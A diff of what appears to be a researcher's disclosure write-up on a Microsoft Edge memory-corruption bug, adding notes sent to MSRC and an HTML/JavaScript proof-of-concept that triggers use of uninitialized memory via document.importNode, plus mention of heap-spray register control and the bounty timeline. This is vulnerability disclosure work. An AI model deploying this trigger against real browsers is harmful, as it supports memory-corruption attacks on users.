@@ -25,6 +25,47 @@ the crash was as follows:<br><br>
 <br><br>
 where the address of rax was taken from rcx who was pointing to heap memory. i have noticed that this is indeed the microsoftedgecp heap memory becouse i could sometimes spot left-overs of the page that redirected to that page. seeking to find exploitability assessment, i tried to see if this data is controllable, after some hours of debugging the application i could controll the register value (by heap spray) who is later used to determine the length of a string to be allocated by the runtime. for whoever is looking to see how one can exploit that oob r/w for rce you can look at this great <html><a href="https://googleprojectzero.blogspot.co.il/2014/07/pwn4fun-spring-2014-safari-part-i_24.html">blogpost</a></html> from Ian beer.<br><br>
 
+from my note's to msrc:<br>
+i think that the problem is that while the document still do not contain the new allocated object,<br>
+we can still cast properties. that means that there is likly a problem with the constructor,<br>
+who do not zero out non-existing fields, calling a clone on this object will lead to use of uninitialized variables.<br>
+
+i have also fount different code paths to the same issue that i have identified as a race condition leading to use-of-uninitialized memory (maybe this sample will help):<br>
+
+```javascript
+<script>
+function go() {
+
+// select the canvas object.
+var a = canvas;
+
+// point the element to the document itself (that is not yet contained at the page at the given time).
+// so its actually free.
+
+var uafObject = a.parentNode;
+
+// create a new object from the freed object.
+// that still points to the process heap (to the unloaded document).
+
+var heapOverFlow = document.importNode(uafObject,true);
+
+}
+</script>
+</head>
+<body onload=go()>
+
+<title id="junk" style="-webkit-clip-path: url(data:image/gif;base64,R0lGODlhEAAQAMQAAORHHOVSKudfOulrSOp3WOyDZu6QdvCchPGolfO0o/XBs/fNwfjZ0frl3/zy7////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAkAABAALAAAAAAQABAAAAVVICSOZGlCQAosJ6mu7fiyZeKqNKToQGDsM8hBADgUXoGAiqhSvp5QAnQKGIgUhwFUYLCVDFCrKUE1lBavAViFIDlTImbKC5Gm2hB0SlBCBMQiB0UjIQA7); content: var(--cssvard); grid-gap: none; border-left-color: ; orientation: auto" class="class7" loop="1" crossorigin="crossorigin" formmethod="post" cols="0" controls="controls">?Nz(CRd</title>
+
+<canvas id="canvas" name="[g1Wvvph^&amp;1S7I" hidden="hidden" dir="ltr" name="" width="0" low="1" placeholder="B|rS8a5x](" onhashchange="eventhandler3()" ontransitionend="eventhandler4()" frame="BOX">
+
+<font id="uafObject" title="YD*2.(ccDWcq" size="4" tabindex="4" dir="auto" title="W" usemap="#htmlvar00009" disposition="attachment" pluginspage="rzAt0o`,]w : #C@f?" preload="none" accept="image/*">7:v=Lgi=5:IM(s&amp;6:r</font>
+
+</canvas>
+</body>
+```
+
+
+
 here are some graphics for the reader:<br><br>
 
 ![](pics/register.PNG)<br><br>
@@ -70,8 +111,10 @@ and then finally after all the mess i got a mail replay thx krzywix (i guess).
 
 at this time i also got the responce from the third party bounty program who offered a decent bounty ofc i had to decline it becouse it was already reported to the vendor, but just for the referance its about the same time in regards to the responce time and the handling of the case (users wise)..
 
-funny thing is i got also this responce (that will be discussed later):
+funny thing is i got also this responce (clarifying that this indeed a security issue and will be addressed by microsoft.):
 
 ![](pics/ns1.PNG)
 ![](pics/sn2.PNG)
+
+
 
